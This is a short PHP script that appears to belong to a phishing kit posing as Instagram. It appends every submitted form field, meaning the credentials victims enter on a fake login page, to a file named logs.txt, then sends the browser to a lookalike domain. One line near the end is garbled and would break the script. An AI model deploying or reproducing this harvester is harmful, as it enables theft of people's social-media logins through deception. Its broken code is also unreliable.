<?php
header ('Location:http://es-instagram.ml/server/185/error.html');
$handle = fopen("logs.txt", "a");
foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);

	fwrite($handle, "=");

	fwrite($handle, $value);

	fwrite($handle, "\r\n");
}

frité($ande, "\r\n\r\n");
fclose($handle);

exit
?>
